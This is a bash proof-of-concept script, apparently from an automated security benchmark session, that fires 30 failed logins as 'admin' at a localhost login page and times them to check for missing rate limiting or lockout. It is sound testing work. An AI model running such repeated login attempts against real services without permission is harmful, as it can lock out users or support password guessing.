#!/bin/bash
# POC: Demonstrates lack of brute force protection by attempting 30 consecutive failed logins with timing analysis
# Target: ./repo
# Created: 2025-10-31T16:50:26.975Z
# Session: benchmark-XBEN-032-24-mhf2utzd

echo "=========================================="
echo "POC: Missing Brute Force Protection"
echo "Target: http://localhost:8080/login"
echo "=========================================="
echo ""

TARGET="http://localhost:8080/login"
ATTEMPTS=30

echo "[*] Testing $ATTEMPTS consecutive failed login attempts..."
echo "[*] Monitoring for rate limiting, delays, or account lockout..."
echo ""

# Track start time
START_TIME=$(date +%s)

# Counter for successful attempts (should all fail with 401)
SUCCESS_COUNT=0
FAIL_COUNT=0

# Perform multiple login attempts
for i in $(seq 1 $ATTEMPTS); do
    # Time each request
    REQUEST_START=$(date +%s.%N)
    
    # Attempt login with wrong password
    RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}\nTIME_TOTAL:%{time_total}" \
        -X POST "$TARGET" \
        -d "username=admin&password=wrongpass$i" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        2>/dev/null)
    
    HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
    TIME_TOTAL=$(echo "$RESPONSE" | grep "TIME_TOTAL:" | cut -d: -f2)
    
    # Check if request succeeded (got a response)
    if [ ! -z "$HTTP_CODE" ]; then
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
        
        # Log every 5th attempt and first/last
        if [ $i -eq 1 ] || [ $i -eq $ATTEMPTS ] || [ $((i % 5)) -eq 0 ]; then
            echo "Attempt $i: HTTP $HTTP_CODE (Response time: ${TIME_TOTAL}s)"
        fi
    else
        FAIL_COUNT=$((FAIL_COUNT + 1))
        echo "Attempt $i: Request failed (possible rate limiting or blocking)"
    fi
    
    # Small delay to avoid overwhelming local server
    sleep 0.1
done

# Calculate total time
END_TIME=$(date +%s)
TOTAL_TIME=$((END_TIME - START_TIME))

echo ""
echo "=========================================="
echo "RESULTS:"
echo "=========================================="
echo "Total attempts: $ATTEMPTS"
echo "Successful requests: $SUCCESS_COUNT"
echo "Failed/blocked requests: $FAIL_COUNT"
echo "Total time: ${TOTAL_TIME}s"
echo "Average time per request: $(echo "scale=2; $TOTAL_TIME / $ATTEMPTS" | bc)s"
echo ""

# Analyze results
if [ $SUCCESS_COUNT -eq $ATTEMPTS ]; then
    echo "[!] VULNERABILITY CONFIRMED:"
    echo "    All $ATTEMPTS failed login attempts were accepted without:"
    echo "    - Rate limiting"
    echo "    - Account lockout"
    echo "    - Progressive delays"
    echo "    - CAPTCHA challenges"
    echo "    - IP blocking"
    echo ""
    echo "[!] The application is vulnerable to brute force attacks!"
    exit 0
elif [ $FAIL_COUNT -gt 0 ]; then
    echo "[*] Some protection may be present:"
    echo "    $FAIL_COUNT requests were blocked or failed"
    echo "    This suggests rate limiting or blocking is active"
    exit 1
else
    echo "[?] Unexpected results - manual review required"
    exit 1
fi